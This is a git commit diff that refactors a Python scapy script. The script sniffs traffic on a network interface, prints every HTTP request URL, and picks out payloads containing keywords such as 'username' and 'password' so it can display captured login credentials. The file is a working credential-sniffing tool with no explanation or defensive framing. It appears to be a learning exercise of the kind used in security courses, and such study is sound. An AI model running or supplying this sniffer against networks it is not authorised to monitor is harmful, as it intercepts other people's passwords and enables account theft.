4823f9fcef950db50e7c34a4e3ded74fc3cd2a4a
Akshaythulasidharan <akshaythulasidharan@gmail.com>
2020-04-06 17:07:54 -0400

    final

--- sniffer/packet_sniffer.py
+++ sniffer/packet_sniffer.py
@@ -6,17 +6,29 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
-def process_sniffed_packet(packet):
-    if(packet.haslayer(http.HTTPRequest)):
-        #print(packet.show())
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print("[+] HTTP Request >>" + url)
-        if(packet.haslayer(scapy.Raw)):
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if(packet.haslayer(scapy.Raw)):
             load = packet[scapy.Raw].load
             keywords = ["username","uname","login","password","pass","user"]
             for keyword in keywords:
                 if keyword in str(load):
-                    print("\n\n[+] Possible username/password >" + load + "\n\n")
-                    break
+                    return load
+                    
+                    
+
+
+def process_sniffed_packet(packet):
+    if(packet.haslayer(http.HTTPRequest)):
+        #print(packet.show())
+        url = get_url(packet)
+        print("[+] HTTP Request >>" + str(url))
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >" + str(login_info) + "\n\n")
+        
 
 sniff("eth0")   # your interface
